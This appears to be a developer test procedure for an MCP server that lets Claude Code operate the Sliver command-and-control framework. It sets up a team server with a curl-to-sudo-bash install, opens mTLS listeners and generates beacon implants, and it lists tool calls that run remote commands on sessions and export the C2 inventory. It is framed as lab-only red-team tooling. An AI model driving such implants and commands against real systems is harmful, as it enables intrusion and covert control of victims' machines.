# Live end-to-end test

This procedure stands up a local Sliver team server, generates an operator
config, registers `sliver-mcp`, and runs a smoke chain. Authorized/lab use only.

## 1. Install Sliver

```bash
# Quick install (server + client):
curl https://sliver.sh/install | sudo bash
# Binaries: sliver-server, sliver (client)
```

Or build from source (`~/projects/sliver`):

```bash
cd ~/projects/sliver && make
```

## 2. Start the team server and create an operator config

Run the server (it listens for operators on 31337 by default):

```bash
sliver-server daemon &        # or run `sliver-server` for the interactive console
```

Generate a multiplayer operator config (mTLS cert + token bundle). With the
binary directly:

```bash
sliver-server operator --name dagar --lhost 127.0.0.1 \
  --save ~/.sliver-client/configs/dagar.cfg
```

This `.cfg` is JSON: `{operator, lhost, lport, token, ca_certificate,
private_key, certificate}`. **Never commit it** (`.gitignore` covers `*.cfg`).

## 3. Install and point sliver-mcp at the config

```bash
cd ~/projects/sliver-mcp
./venv/bin/pip install -e .
export SLIVER_CONFIG=~/.sliver-client/configs/dagar.cfg
```

## 4. Smoke test (standalone, no Claude needed)

`scripts/smoke.py` (below) drives the manager directly. Or run the equivalent
tool sequence from Claude Code once registered.

```bash
./venv/bin/python - <<'PY'
import asyncio, os
from sliver_mcp.manager import SliverManager

async def main():
    m = SliverManager(os.environ["SLIVER_CONFIG"])
    v = await m.connect()
    print("connected to", f"{v.Major}.{v.Minor}.{v.Patch}", "as", m.operator)

    # start an mTLS listener on a free port
    lis = await m.client.start_mtls_listener(host="0.0.0.0", port=8443)
    print("mtls listener job:", lis.JobID)

    # generate a beacon for this host's OS
    from sliver_mcp.implant import build_implant_config
    cfg, url = build_implant_config(
        c2_host="127.0.0.1", c2_port=8443, protocol="mtls",
        os="linux", fmt="exe", is_beacon=True, interval=5, jitter=1)
    gen = await m.client.generate_implant(cfg)
    print("generated", gen.File.Name, len(gen.File.Data), "bytes, c2", url)

    print("sessions:", len(await m.client.sessions()))
    print("beacons:", len(await m.client.beacons()))
    await m.disconnect()

asyncio.run(main())
PY
```

To get a live session, write the generated implant to disk and run it on a lab
host (or this host), then:

- `poll_events()` / `list_sessions()` until the callback appears,
- `set_noise("yellow")` then `execute_command(<id>, "whoami")`,
- `export_handoff()` to dump the C2 inventory.

## 5. Ports already in use

On this workstation `127.0.0.1:55553` and `:4444` were observed listening from
earlier work — pick free ports for listeners during testing.

## 6. Through Claude Code

After registering (see README), the same chain in tool form:

```text
mcp__sliver__connect()
mcp__sliver__status()
mcp__sliver__set_noise("yellow")
mcp__sliver__start_mtls_listener(port=8443)
mcp__sliver__generate_beacon(c2_host="127.0.0.1", c2_port=8443, protocol="mtls",
                             os="linux", interval=5, jitter=1)
# run the implant, then:
mcp__sliver__poll_events()
mcp__sliver__list_sessions()
mcp__sliver__execute_command(target_id, "whoami")
mcp__sliver__export_handoff()
```
